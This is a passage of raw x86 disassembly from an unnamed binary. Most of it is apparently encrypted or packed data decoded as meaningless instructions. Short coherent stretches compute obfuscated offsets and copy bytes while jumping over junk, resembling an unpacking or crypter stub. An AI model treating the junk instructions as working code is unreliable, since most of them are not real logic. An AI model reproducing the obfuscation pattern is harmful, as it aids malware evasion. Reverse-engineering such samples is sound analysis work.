  40dabd:	sbb    eax,DWORD PTR [ebp+0x48]
  40dac0:	lea    ecx,[eax+ecx*1-0x178a2bbc]
  40dac7:	xchg   ebp,eax
  40dac8:	xor    al,0x41
  40daca:	add    al,0xd0
  40dacc:	in     al,0xbd
  40dace:	or     bh,BYTE PTR [edi-0x729c867b]
  40dad4:	fcmovnb st,st(7)
  40dad6:	int3   
  40dad7:	inc    esi
  40dad8:	cmc    
  40dad9:	cmp    al,0xd3
  40dadb:	outs   dx,DWORD PTR ds:[esi]
  40dadc:	jg     0x40daa7
  40dade:	mov    esp,0xe595ee95
  40dae3:	add    edi,DWORD PTR [eax-0xd559026]
  40dae9:	imul   ecx,DWORD PTR [eax-0x6bf5a3c9],0x4b
  40daf0:	pop    ecx
  40daf1:	and    eax,0x54c00c69
  40daf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf7:	test   dh,cl
  40daf9:	add    eax,0x9dc37625
  40dafe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daff:	imul   esi,DWORD PTR [edi+ecx*4-0x4e],0xb2d0d071
  40db07:	ds stos BYTE PTR es:[edi],al
  40db09:	lds    ecx,FWORD PTR [esi]
  40db0b:	add    dx,WORD PTR [edx-0xe49504a]
  40db12:	xor    BYTE PTR [esi],0x1b
  40db15:	out    dx,eax
  40db16:	out    dx,eax
  40db17:	jo     0x40dac0
  40db19:	imul   ebp,DWORD PTR [ebx],0x33
  40db1c:	test   DWORD PTR [edi],ecx
  40db1e:	test   DWORD PTR [ecx],edx
  40db20:	and    bl,bl
  40db22:	scas   eax,DWORD PTR es:[edi]
  40db23:	xor    ch,BYTE PTR [eax]
  40db25:	xchg   esi,eax
  40db26:	lds    ebp,FWORD PTR [ebp-0x81dff19]
  40db2c:	mov    dh,al
  40db2e:	xor    BYTE PTR [eax-0xbc765fc],bh
  40db34:	sub    al,0x33
  40db36:	enter  0x9195,0x15
  40db3a:	and    DWORD PTR [eax],eax
  40db3c:	sbb    al,0xe8
  40db3e:	stos   DWORD PTR es:[edi],eax
  40db3f:	or     al,0x7d
  40db41:	cld    
  40db42:	xor    ebx,DWORD PTR [esi+0x6908458b]
  40db48:	leave  
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dbd1
  40db97:	stos   BYTE PTR es:[edi],al
  40db98:	inc    ebp
  40db99:	push   0x5b
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    dh,dh
  40dba3:	xchg   edi,eax
  40dba4:	shl    BYTE PTR [esi],0xc6
  40dba7:	add    DWORD PTR [ebx+0x5ad4756e],edi
  40dbad:	jmp    0x40dbb8
  40dbaf:	cld    
  40dbb0:	loop   0x40db44
  40dbb2:	adc    BYTE PTR [bx+si],0x32
  40dbb6:	cmp    BYTE PTR [ebx+0x54],bh
  40dbb9:	pop    ebp
  40dbba:	mov    edi,0x14f01d21
  40dbbf:	es div esi
  40dbc2:	cmc    
  40dbc3:	imul   edi,DWORD PTR [ebx+0x12],0x2b147aa7
  40dbca:	pop    ds
  40dbcb:	scas   al,BYTE PTR es:[edi]
  40dbcc:	add    eax,DWORD PTR [ebp+0x36]
  40dbcf:	dec    edi
  40dbd0:	xchg   edx,eax
  40dbd1:	shl    BYTE PTR [edx],1
  40dbd3:	sahf   
  40dbd4:	jno    0x40dc46
  40dbd6:	adc    dh,BYTE PTR [ecx+0x62]
  40dbd9:	xor    al,0xfa
  40dbdb:	imul   edi,DWORD PTR [edx+0x49],0xffffffba
  40dbdf:	loop   0x40dc27
  40dbe1:	jge    0x40dc02
  40dbe3:	int3   
  40dbe4:	or     al,0xb2
  40dbe6:	test   DWORD PTR [ebp+0x6e],edi
  40dbe9:	adc    dl,ah
  40dbeb:	shl    bh,0xc
  40dbee:	jo     0x40dc52
  40dbf0:	addr16 enter 0x289a,0x29
  40dbf5:	xchg   ebp,eax
  40dbf6:	pusha  
  40dbf7:	push   ds
  40dbf8:	add    BYTE PTR [edi-0x4fc32e70],al
  40dbfe:	jmp    0x317e8cb
  40dc03:	imul   ebx,edx,0xffffff82
  40dc06:	mov    edx,0xba254366
  40dc0b:	jge    0x40dc78
  40dc0d:	and    al,BYTE PTR [esi+ebx*2+0x79]
  40dc11:	sbb    ecx,0xfffffff2
  40dc14:	pop    eax
  40dc15:	pop    esp
  40dc16:	push   edi
  40dc17:	or     bx,WORD PTR [ecx]
  40dc1a:	pop    eax
  40dc1b:	and    bh,BYTE PTR [esi-0x4cf7886c]
  40dc21:	out    0x14,eax
  40dc23:	dec    edi
  40dc25:	dec    esi
  40dc26:	stc    
  40dc27:	sbb    al,BYTE PTR [ebx]
  40dc29:	mov    bl,0xb9
  40dc2b:	pushf  
  40dc2c:	int3   
  40dc2d:	daa    
  40dc2e:	lods   eax,DWORD PTR ds:[esi]
  40dc2f:	jmp    0x127d:0xccf1f1f5
  40dc36:	lods   al,BYTE PTR ds:[esi]
  40dc37:	jae    0x40dc90
  40dc39:	arpl   WORD PTR [edi+0x3a],cx
  40dc3c:	xchg   BYTE PTR [ebp-0x30],bl
  40dc3f:	pusha  
  40dc40:	dec    ebx
  40dc41:	or     cl,BYTE PTR ss:[ecx+ebp*1+0x60]
  40dc46:	(bad)  
  40dc47:	pop    ss
  40dc48:	and    ch,BYTE PTR [ebp-0x6d]
  40dc4b:	sub    cl,BYTE PTR [esp+ebx*8]
  40dc4e:	sbb    eax,0x94d1cc7e
  40dc53:	test   DWORD PTR [edx],edi
  40dc55:	out    dx,eax
  40dc56:	popf   
  40dc57:	push   0x65f0f42c
  40dc5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc5d:	jmp    0xfd4f8c1e
  40dc62:	pop    esi
  40dc63:	mov    dl,0x50
  40dc65:	jnp    0x40dc8c
  40dc67:	es nop
  40dc69:	nop
  40dc6a:	imul   esi,DWORD PTR [ecx],0x50b64eef
  40dc70:	adc    BYTE PTR [ecx+0x5e],0x27
  40dc74:	xchg   ebx,eax
  40dc75:	ds stc 
  40dc77:	jg     0x40dcce
  40dc79:	or     eax,0xbc6c2fde
  40dc7e:	ds int3 
  40dc80:	push   edi
  40dc81:	ss or  al,0x81
  40dc84:	jae    0x40dc87
  40dc86:	test   ebx,edx
  40dc88:	and    BYTE PTR [edi],bh
  40dc8a:	mov    eax,ds:0x8bb64a5e
  40dc8f:	out    dx,eax
  40dc90:	inc    esp
  40dc91:	add    ecx,DWORD PTR ds:0x69165f19
  40dc97:	aad    0xd5
  40dc99:	iret   
  40dc9a:	in     al,dx
  40dc9b:	je     0x40dd0d
  40dc9d:	sbb    ax,0x20b5
  40dca1:	stos   DWORD PTR es:[edi],eax
  40dca2:	xor    DWORD PTR [edx-0x19e43c19],edi
  40dca8:	lahf   
  40dca9:	nop
  40dcaa:	lock inc esp
  40dcac:	ds cwde 
  40dcae:	pcmpgtd mm2,QWORD PTR [eax-0x6e]
  40dcb2:	inc    esp
  40dcb3:	cmp    cl,bh
  40dcb5:	adc    dl,BYTE PTR [ebx-0x7b]
  40dcb8:	sbb    BYTE PTR [esi+0xe],dh
  40dcbb:	cbw    
  40dcbd:	push   ecx
  40dcbe:	lods   al,BYTE PTR ds:[esi]
  40dcbf:	in     eax,0xb0
  40dcc1:	jae    0x40dc85
  40dcc3:	sub    ah,ah
  40dcc5:	and    bl,BYTE PTR [ebx-0x5e7b9040]
  40dccb:	nop
  40dccc:	rcl    DWORD PTR [ecx+0x66d0a955],1
  40dcd2:	stos   DWORD PTR es:[edi],eax
  40dcd3:	pusha  
  40dcd4:	jmp    0x4f60e47d
  40dcd9:	mov    bl,0xde
  40dcdb:	fidiv  WORD PTR [ecx-0x1be53c05]
  40dce1:	jns    0x40dce3
  40dce3:	pop    ds
  40dce4:	lfence 
  40dce7:	std    
  40dce8:	and    ah,dl
  40dcea:	in     eax,0x9
  40dcec:	cmp    al,0x98
  40dcee:	test   BYTE PTR [ecx-0x64],dl
  40dcf1:	popf   
  40dcf2:	mov    eax,0x96bd4517
  40dcf7:	jnp    0x40dd10
  40dcf9:	inc    eax
  40dcfa:	push   DWORD PTR [esi+0x76177bff]
  40dd00:	ret    
  40dd01:	mov    al,0x61
  40dd03:	jge    0x40dcba
  40dd05:	scas   al,BYTE PTR es:[edi]
  40dd06:	jmp    0xbb239305
  40dd0b:	sbb    esi,0x4a66c63e
  40dd11:	inc    edx
  40dd12:	pop    es
  40dd13:	ss cmp al,0xaa
  40dd16:	scas   eax,DWORD PTR es:[edi]
  40dd17:	out    dx,al
  40dd18:	push   ebp
  40dd19:	xchg   esi,eax
  40dd1a:	adc    BYTE PTR [ebx+0x77],bh
  40dd1d:	fadd   DWORD PTR [ebp-0xf]
  40dd20:	in     al,0xaf
  40dd22:	fs icebp 
  40dd24:	arpl   WORD PTR [edi+eax*8-0x16],cx
  40dd28:	sahf   
  40dd29:	out    0xa3,eax
  40dd2b:	dec    ebp
  40dd2c:	pop    esi
  40dd2d:	xor    al,0x25
  40dd2f:	mov    ecx,0x723b1832
  40dd34:	nop
  40dd35:	add    al,0xf6
  40dd37:	sub    ecx,DWORD PTR [eax+ebx*2]
  40dd3a:	aaa    
  40dd3b:	sub    ecx,DWORD PTR [ebp-0x52]
  40dd3e:	add    BYTE PTR [eax-0x67],ah
  40dd41:	push   0xa87a18b7
  40dd46:	jbe    0x40dd5f
  40dd48:	add    DWORD PTR [ebx-0x23e0f064],ecx
  40dd4e:	and    BYTE PTR [edx-0x3d],bl
  40dd51:	sub    BYTE PTR [esi-0x63],0x2a
  40dd55:	add    BYTE PTR [ecx-0x79],bl
  40dd58:	sub    eax,0xc415cd89
  40dd5d:	scas   al,BYTE PTR es:[edi]
  40dd5e:	jle    0x40dd3d
  40dd60:	push   ecx
  40dd61:	sar    BYTE PTR [eax],0x4c
  40dd64:	jae    0x40dd8a
  40dd66:	ret    
  40dd67:	sar    BYTE PTR [ebx],0x2b
  40dd6a:	jle    0x40dd85
  40dd6c:	mov    ds:0xc6051ae0,al
  40dd71:	push   cs
  40dd72:	pop    eax
  40dd73:	mov    esp,0x81f678da
  40dd78:	ins    DWORD PTR es:[edi],dx
  40dd79:	jmp    0xb53bca5e
  40dd7e:	ja     0x40ddbb
  40dd80:	aaa    
  40dd81:	std    
  40dd82:	(bad)  
  40dd83:	pop    edx
  40dd84:	xchg   DWORD PTR [edx-0x43491288],edx
  40dd8a:	retf   
  40dd8b:	test   ch,0x16
  40dd8e:	cmp    eax,0x451ceb60
  40dd93:	std    
  40dd94:	fimul  DWORD PTR [edi]
  40dd96:	fstp   QWORD PTR [ebx-0x58]
  40dd99:	push   esi
  40dd9a:	sub    bl,BYTE PTR [si]
  40dd9d:	add    al,0xf3
  40dd9f:	mov    esi,0xa4809bf9
  40dda4:	inc    BYTE PTR [ebx-0x3313b053]
  40ddaa:	(bad)  
  40ddab:	push   0x966ea2f2
  40ddb0:	cmp    dl,BYTE PTR [edx+0x21135a0d]
  40ddb6:	mov    dl,0xc4
  40ddb8:	and    ebx,DWORD PTR [eax-0x35aef45e]
  40ddbe:	xchg   esi,eax
  40ddbf:	bound  edi,QWORD PTR [ebx-0x1a]
  40ddc2:	or     eax,0x67ad6b69
  40ddc7:	popa   
  40ddc8:	sbb    BYTE PTR [ebx-0x12],dh
  40ddcb:	sbb    bh,BYTE PTR [ebx+0x4983aa11]
  40ddd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd2:	pop    es
  40ddd3:	nop
  40ddd4:	xor    BYTE PTR [ebp-0x547b4a4d],bh
  40ddda:	pop    ds
  40dddb:	pop    edx
  40dddc:	nop
  40dddd:	adc    edx,edx
  40dddf:	and    eax,0x68d61787
  40dde4:	sbb    edx,DWORD PTR [ecx-0x6c30cbe8]
  40ddea:	or     edx,DWORD PTR [eax]
  40ddec:	adc    al,0x3b
  40ddee:	sbb    al,al
  40ddf0:	lahf   
  40ddf1:	dec    edx
  40ddf2:	push   ds
  40ddf3:	mul    DWORD PTR [eax-0x76]
  40ddf6:	stos   DWORD PTR es:[edi],eax
  40ddf7:	pop    eax
  40ddf8:	cli    
  40ddf9:	inc    ecx
  40ddfa:	out    dx,eax
  40ddfb:	(bad)  
  40ddfc:	daa    
  40ddfd:	mov    ah,0x4f
  40ddff:	inc    ebx
  40de00:	xlat   BYTE PTR ds:[ebx]
  40de01:	push   ebp
  40de02:	mov    al,0x2
  40de04:	or     ch,BYTE PTR [edi-0x1df72720]
  40de0a:	(bad)  
  40de0b:	(bad)  
  40de0c:	js     0x40de77
  40de0e:	(bad)  
  40de0f:	xor    ch,BYTE PTR [ebx]
  40de11:	mov    ecx,0xc8db96c4
  40de16:	cmp    bh,BYTE PTR [ecx-0x26867961]
  40de1c:	xor    esp,edx
  40de1e:	push   0x877ac86d
  40de23:	loop   0x40de4e
  40de25:	jae    0x40dde7
  40de27:	pop    edx
  40de28:	popf   
  40de29:	inc    edi
  40de2a:	cld    
  40de2b:	ins    DWORD PTR es:[edi],dx
  40de2c:	xlat   BYTE PTR ds:[ebx]
  40de2d:	lock (bad) 
  40de2f:	std    
  40de30:	dec    ecx
  40de31:	hlt    
  40de32:	xchg   ebp,eax
  40de33:	dec    esp
  40de34:	add    DWORD PTR [edi-0x52],ecx
  40de37:	inc    ecx
  40de38:	and    BYTE PTR [ebp+0x35],ah
  40de3b:	inc    edi
  40de3c:	push   ebx
  40de3d:	cmp    eax,0x51cd9663
  40de42:	(bad)
  40de45:	adc    al,0x9e
  40de47:	xchg   edi,eax
  40de48:	leave  
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x4225b8
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de52
  40deca:	pop    esp
  40decb:	or     al,0x7e
  40decd:	adc    al,0xcc
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    bh,bh
  40ded6:	dec    esi
  40ded7:	(bad)  
  40ded9:	into   
  40deda:	cmp    BYTE PTR [ecx+0x6b5355a],dl
  40dee0:	js     0x40de95
  40dee2:	pop    ebx
  40dee3:	push   0xffffffa5
  40dee5:	mov    edx,0x1af0c5c9
  40deea:	sahf   
  40deeb:	out    0x4e,al
  40deed:	push   ss
  40deee:	adc    eax,0x459767b5
  40def3:	fnstsw WORD PTR [eax-0x7fddfab6]
  40def9:	mov    eax,0x2edb4fd0
  40defe:	in     eax,0xb0
  40df00:	(bad)  
  40df01:	fucomp st(4)
  40df03:	je     0x40df63
  40df05:	or     eax,0x170b7434
  40df0a:	inc    edi
  40df0b:	add    esi,DWORD PTR [ecx]
  40df0d:	sub    BYTE PTR [ecx-0x8],0x41
  40df11:	pop    ebp
  40df12:	aas    
  40df13:	idiv   ebp
  40df15:	mov    ah,0x38
  40df17:	mov    edx,DWORD PTR [esi+0x73]
  40df1a:	(bad)  
  40df1b:	push   eax
  40df1c:	inc    edi
  40df1d:	aad    0x17
  40df1f:	mov    esp,0x4dc5ec34
  40df24:	pushf  
  40df25:	cs jns 0x40df8e
  40df28:	mov    ah,0x49
  40df2a:	lock (bad) 
  40df2c:	repz xchg ebx,eax
  40df2e:	jl     0x40df9b
  40df30:	mov    eax,0xeabdd7fd
  40df35:	xor    dl,BYTE PTR [ebx-0x34c12e09]
  40df3b:	out    dx,eax
  40df3c:	jmp    0xe34fcc2c
  40df41:	xchg   esi,eax
  40df42:	imul   esp,DWORD PTR [edi+0x21151fca],0x80bb71d4
  40df4c:	dec    edi
  40df4d:	out    dx,al
  40df4e:	jp     0x40df85
  40df50:	mov    al,ds:0xa39cbfa5
  40df55:	pop    es
  40df56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df57:	sbb    dl,bh
  40df59:	add    ebx,DWORD PTR [edi+eax*2-0x31]
  40df5d:	je     0x40df43
  40df5f:	mov    WORD PTR [esi],cs
  40df61:	mov    dh,0x3
  40df63:	jbe    0x40dfbc
  40df65:	jmp    0x40df1e
  40df67:	leave  
  40df68:	imul   ebp,DWORD PTR [ebp+0x2b],0x28
  40df6c:	mov    edi,0xb0f1703d
  40df71:	es and edi,esp
  40df74:	xchg   edx,eax
  40df75:	push   0xffffffaf
  40df77:	fbstp  TBYTE PTR [eax]
  40df79:	out    0x7e,al
  40df7b:	mov    esi,0x92a2c16
  40df80:	out    0xd2,al
  40df82:	sub    eax,0xa47b6012
  40df87:	sub    edi,DWORD PTR [edi-0x13]
  40df8a:	pop    eax
  40df8b:	jmp    0x40dfea
  40df8d:	test   DWORD PTR [edi+0x194bf9a4],esi
  40df93:	loop   0x40df80
  40df95:	cmp    eax,0x47a14354
  40df9a:	or     ch,bh
  40df9c:	mov    bl,dh
  40df9e:	cld    
  40df9f:	mov    dh,0xe0
  40dfa1:	add    al,0xe5
  40dfa3:	and    edx,DWORD PTR [ebx+0x56]
  40dfa6:	xchg   BYTE PTR [esi-0x14e8c8ff],dl
  40dfac:	mov    bl,0x7a
  40dfae:	mov    ds:0x6050498,al
  40dfb3:	pop    eax
  40dfb4:	dec    edx
  40dfb5:	push   0xfffffff7
  40dfb7:	in     eax,0xf1
  40dfb9:	jl     0x40dfcd
  40dfbb:	out    dx,eax
  40dfbc:	dec    ebp
  40dfbd:	iret   
  40dfbe:	adc    BYTE PTR [ecx+0x7c],0xad
  40dfc2:	add    DWORD PTR [edx],ebp
  40dfc4:	mov    dl,0xb2
  40dfc6:	mov    esp,0xf17d321e
  40dfcb:	and    al,0xb2
  40dfcd:	out    0x47,al
  40dfcf:	mov    esp,DWORD PTR [esi]
  40dfd1:	lds    edi,FWORD PTR [edi+0xd11a639]
  40dfd7:	imul   esi,DWORD PTR [esp+eax*8+0x3094cc91],0x869b5541
  40dfe2:	dec    BYTE PTR [edi+0x72]
  40dfe5:	sbb    eax,0xe7c0c48f
  40dfea:	jge    0x40e05f
  40dfec:	push   eax
  40dfed:	(bad)  
  40dfee:	xlat   BYTE PTR ds:[ebx]
  40dfef:	jg     0x40e001
  40dff1:	or     al,0xce
  40dff3:	push   ss
  40dff4:	ins    BYTE PTR es:[edi],dx
  40dff5:	mov    bh,0x52
  40dff7:	inc    edi
  40dff8:	or     al,BYTE PTR [edi-0x4d]
  40dffb:	ins    DWORD PTR es:[edi],dx
  40dffc:	(bad)  
  40dffd:	bound  ebx,QWORD PTR [edi-0x17]
  40e000:	addr16 push ecx
  40e002:	jmp    0xcc878ee0
  40e007:	loope  0x40dfe4
  40e009:	(bad)  
  40e00a:	xlat   BYTE PTR ds:[ebx]
  40e00b:	mov    dl,0x41
  40e00d:	cmc    
  40e00e:	arpl   WORD PTR ds:0x6a32281c,bp
  40e014:	imul   ecx,DWORD PTR [edx+0x22],0x7a908f80
  40e01b:	cs sub esi,edi
  40e01e:	outs   dx,DWORD PTR ds:[esi]
  40e01f:	cmp    DWORD PTR [eax-0x3],edi
  40e022:	and    al,0x7c
  40e024:	or     DWORD PTR [ebx],ebx
  40e026:	fistp  DWORD PTR [ebx]
  40e028:	jmp    0x11d7c9e8
  40e02d:	ret    
  40e02e:	adc    eax,0xbecda882
  40e033:	sub    al,0x9c
  40e035:	(bad)  
  40e036:	jmp    0x4be9ffe4
  40e03b:	(bad)  
  40e03c:	adc    eax,0x8cbdb032
  40e041:	arpl   WORD PTR [edx],bp
  40e043:	sub    eax,0xa4e25d5a
  40e048:	add    BYTE PTR [esi+0x6216965b],0xcc
  40e04f:	addr16 (bad) 
  40e052:	ja     0x40e09e
  40e054:	outs   dx,DWORD PTR ds:[esi]
  40e055:	xlat   BYTE PTR ds:[ebx]
  40e056:	cmp    ecx,eax
  40e058:	sub    edx,DWORD PTR [esi-0x71]
  40e05b:	loopne 0x40dfe5
  40e05d:	dec    ebp
  40e05e:	inc    esp
  40e05f:	cmp    DWORD PTR [esi+0x32],esp
  40e062:	retf   
  40e063:	das    
  40e064:	add    BYTE PTR [ebp+0x44],ch
  40e067:	rcr    BYTE PTR [edi],1
  40e069:	sub    BYTE PTR [ecx+edi*1],dl
  40e06c:	inc    edi
  40e06d:	outs   dx,DWORD PTR ds:[esi]
  40e06e:	nop
  40e06f:	add    eax,DWORD PTR [ecx]
  40e071:	adc    ecx,esi
  40e073:	ja     0x40e096
  40e075:	cmp    DWORD PTR [ebx+ecx*2-0x2e],edx
  40e079:	jmp    0x40e01d
  40e07b:	mov    dh,0xdf
  40e07d:	xchg   edi,eax
  40e07e:	mov    ebx,0xea161ca
  40e083:	push   ebx
  40e084:	dec    ecx
  40e085:	xor    ah,dh
  40e087:	adc    DWORD PTR [ebp+0x409b19a1],eax
  40e08d:	lock pop edi
  40e08f:	xor    eax,0x7ccb6e28
  40e094:	xchg   esi,eax
  40e095:	inc    BYTE PTR [edx]
  40e097:	adc    BYTE PTR [edi+0x48],bl
  40e09a:	mov    edx,0x92a6b94d
  40e09f:	outs   dx,BYTE PTR ds:[esi]
  40e0a0:	cld    
  40e0a1:	pusha  
  40e0a2:	push   0x8e8b05d3
  40e0a7:	push   edx
  40e0a8:	jecxz  0x40e0b1
  40e0aa:	bound  esi,QWORD PTR [edx-0x40]
  40e0ad:	push   es
  40e0ae:	(bad)  
  40e0af:	fucomp st(5)
  40e0b1:	aam    0x18
  40e0b3:	or     bl,dh
  40e0b5:	xchg   BYTE PTR [ebx],dl
  40e0b7:	jge    0x40e0f0
  40e0b9:	adc    eax,0xa402da95
  40e0be:	push   ecx
  40e0bf:	int    0xa8
  40e0c1:	in     eax,0xc1
  40e0c3:	stos   BYTE PTR es:[edi],al
  40e0c4:	aas    
  40e0c5:	and    eax,0x69766b39
  40e0ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0cb:	aas    
  40e0cc:	sub    dh,BYTE PTR [ecx+0x3f]
  40e0cf:	add    ebx,DWORD PTR [edx]
  40e0d1:	xchg   esi,eax
  40e0d2:	inc    ecx
  40e0d3:	lds    ebx,FWORD PTR [edi+0x41]
  40e0d6:	pop    edi
  40e0d7:	test   al,0xcf
  40e0d9:	and    DWORD PTR [ebx],edx
  40e0db:	fild   WORD PTR [eax-0x2521f762]
  40e0e1:	lea    ecx,[ecx-0x14187f0e]
  40e0e7:	cdq    
  40e0e8:	dec    esp
  40e0e9:	jbe    0x40e159
  40e0eb:	mov    al,ds:0x6b5f8f86
  40e0f0:	rcl    cl,0x48
  40e0f3:	cmp    esi,ecx
  40e0f5:	ss cli 
  40e0f7:	inc    ebp
  40e0f8:	pop    edx
  40e0f9:	add    eax,0x92a77ca9
  40e0fe:	retf   
  40e0ff:	in     al,0xae
  40e101:	inc    ebp
  40e102:	cmp    eax,0xc1d0596a
  40e107:	push   esp
  40e108:	popa   
  40e109:	add    DWORD PTR [ebx-0x40570be5],esp
  40e10f:	int    0x8b
  40e111:	ins    DWORD PTR es:[edi],dx
  40e112:	(bad)  
  40e113:	mov    cs,WORD PTR [eax+0x24ad47a7]
  40e119:	stc    
  40e11a:	and    DWORD PTR ds:0x55a53295,esp
  40e120:	in     al,0x50
  40e122:	pop    esi
  40e123:	imul   edi,DWORD PTR [ebp+ebx*8+0x7e],0xffffff98
  40e128:	inc    eax
  40e129:	xor    dh,BYTE PTR [ecx]
  40e12b:	ds cmc 
  40e12d:	scas   eax,DWORD PTR es:[edi]
  40e12e:	mov    DWORD PTR [esi],esi
  40e130:	dec    esi
  40e131:	lar    ebx,WORD PTR ds:0xffac4611
  40e138:	pop    ecx
  40e139:	ss xchg edx,eax
  40e13b:	jp     0x40e1ba
  40e13d:	inc    ebp
  40e13e:	fild   QWORD PTR [edi+0x57]
  40e141:	mov    ecx,0x74281815
  40e146:	and    BYTE PTR [ecx+0x7fa3984b],cl
  40e14c:	fld    DWORD PTR [esi]
  40e14e:	or     DWORD PTR [ebp-0x28],esi
  40e151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e152:	pop    edi
  40e153:	jbe    0x40e16b
  40e155:	mov    ah,0x2f
  40e157:	(bad)  
  40e158:	in     al,0xfd
  40e15a:	inc    esp
  40e15b:	ss jmp 0xfb2f:0x3ac2f809
  40e163:	push   ebx
  40e164:	pusha  
  40e165:	mov    dl,BYTE PTR [edx-0x449675d4]
  40e16b:	inc    eax
  40e16c:	push   es
  40e16d:	mov    al,ds:0xf626a412
  40e172:	adc    BYTE PTR [edx+0xe],dh
  40e175:	test   BYTE PTR [ebp+0x46b5a615],al
  40e17b:	ret    
  40e17c:	mov    eax,DWORD PTR [ebp-0x10]
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e119
  40e199:	loope  0x40e199
  40e19b:	mov    esi,0x1818c8ce
  40e1a0:	rcl    BYTE PTR [eax+ebx*1],cl
  40e1a3:	sbb    al,ah
  40e1a5:	ds mov ch,0xf8
  40e1a8:	inc    esi
  40e1a9:	add    cl,bl
  40e1ab:	sub    BYTE PTR [ecx],dl
  40e1ad:	mov    WORD PTR [ebx],es
  40e1af:	dec    ebp
  40e1b0:	call   0xef75:0x7ad71a67
  40e1b7:	cmp    ecx,eax
  40e1b9:	rcr    DWORD PTR [ebx+eiz*1-0x2e],1
  40e1bd:	jae    0x40e15f
  40e1bf:	loope  0x40e141
  40e1c1:	in     eax,dx
  40e1c2:	jne    0x40e196
  40e1c4:	in     al,0x76
  40e1c6:	xlat   BYTE PTR ds:[ebx]
  40e1c7:	or     eax,0x4d42f110
  40e1cc:	dec    esp
  40e1cd:	jg     0x40e24c
  40e1cf:	adc    BYTE PTR [esi-0x17952226],ch
  40e1d5:	push   ss
  40e1d6:	sbb    ah,BYTE PTR [ecx-0x25a5643]
  40e1dc:	cdq    
  40e1dd:	mov    ch,0x13
  40e1df:	xchg   esp,eax
  40e1e0:	xor    al,0xd8
  40e1e2:	in     al,dx
  40e1e3:	add    BYTE PTR [eax],bh
  40e1e5:	lods   al,BYTE PTR ds:[esi]
  40e1e6:	and    esi,DWORD PTR [esi]
  40e1e8:	mov    BYTE PTR [edx-0x5bb0aadc],cl
  40e1ee:	jmp    DWORD PTR [ebx+0x58]
  40e1f1:	cmpps  xmm2,xmm0,0x38
  40e1f5:	popf   
  40e1f6:	sub    eax,0x7cdf7e43
  40e1fb:	add    eax,0x6752e39
  40e200:	(bad)  
  40e201:	push   esi
  40e202:	fwait
  40e203:	imul   ebx,DWORD PTR [eax],0xb37cd259
  40e209:	aas    
  40e20a:	(bad)
  40e20e:	ja     0x40e248
  40e210:	fs aaa 
  40e212:	xor    dl,BYTE PTR [edi+eiz*2-0x65]
  40e216:	and    ecx,DWORD PTR [ebp+0x12bf5039]
  40e21c:	icebp  
  40e21d:	rol    DWORD PTR [ecx],0x6e
  40e220:	pop    DWORD PTR [esi]
  40e222:	push   edi
  40e223:	nop
  40e224:	sub    BYTE PTR [ebx],dl
  40e226:	jbe    0x40e1cc
  40e228:	out    0x6f,al
  40e22a:	mov    esp,0xe028ede3
  40e22f:	ret    
  40e230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e231:	aas    
  40e232:	jno    0x40e201
  40e234:	mov    DWORD PTR [bp+si],esi
  40e237:	fdivp  st(2),st
